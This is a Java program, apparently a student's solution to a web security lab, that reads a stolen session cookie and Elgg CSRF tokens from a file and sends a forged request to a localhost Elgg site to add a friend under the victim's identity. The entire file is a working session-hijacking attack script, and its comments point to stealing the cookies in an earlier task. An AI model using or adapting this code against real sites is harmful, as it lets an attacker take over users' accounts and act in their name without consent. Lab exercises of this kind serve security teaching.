import java.io.*;
import java.net.*;
import java.util.*;
public class HTTPSimpleForge {


	public static List<String> readFile(String filename)
	{
	  List<String> tokens = new ArrayList<String>();
	  try
	  {
		BufferedReader reader = new BufferedReader(new FileReader(filename));
		String line;
		while ((line = reader.readLine()) != null)
		{
		  tokens.add(line);
		}
		reader.close();
		return tokens;
	  }
	  catch (Exception e)
	  {
		System.err.format("Exception occurred trying to read '%s'.", filename);
		e.printStackTrace();
		return null;
	  }
	}
	public static void main(String[] args) throws IOException {
		try {
			
			// Inputs from file
			List<String> tokens = new ArrayList<String>();
			tokens = readFile("HTTPSimpleForge.txt");
			String elgg_ts = tokens.get(0);
			String elgg_token = tokens.get(1);
			String cookie = tokens.get(2);

			int responseCode;
			InputStream responseIn=null;
			String requestDetails = "&__elgg_ts="+elgg_ts+"&__elgg_token="+elgg_token;

			// URL to be forged.
			URL url = new URL ("http://localhost:8082/action/friends/add?friend=40"+requestDetails);

			// URLConnection instance is created to further parameterize a
			// resource request past what the state members of URL instance
			// can represent.
			HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
			if (urlConn instanceof HttpURLConnection) {
				urlConn.setConnectTimeout(60000);
				urlConn.setReadTimeout(90000);
			}

			// addRequestProperty method is used to add HTTP Header Information.
			// Here we add User-Agent HTTP header to the forged HTTP packet.
			// Add other necessary HTTP Headers yourself. Cookies should be stolen
			// using the method in task3.
			urlConn.addRequestProperty("User-agent", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0");

			// I added the line below
			urlConn.addRequestProperty("Cookie",cookie);

			// HttpURLConnection a subclass of URLConnection is returned by
			// url.openConnection() since the url is an http request.
			if (urlConn instanceof HttpURLConnection) {
				HttpURLConnection httpConn = (HttpURLConnection) urlConn;
				// Contacts the web server and gets the status code from
				// HTTP Response message.
				responseCode = httpConn.getResponseCode();
				System.out.println("Response Code = " + responseCode);
				// HTTP status code HTTP_OK means the response was
				// received sucessfully.
				if (responseCode == HttpURLConnection.HTTP_OK)
					// Get the input stream from url connection object.
					responseIn = urlConn.getInputStream();
				// Create an instance for BufferedReader
				// to read the response line by line.
				BufferedReader buf_inp = new BufferedReader(
						new InputStreamReader(responseIn));
				String inputLine;
				while((inputLine = buf_inp.readLine())!=null) {
					System.out.println(inputLine);
				}
			}
		} catch (MalformedURLException e) {
			e.printStackTrace();
		}
	}
}
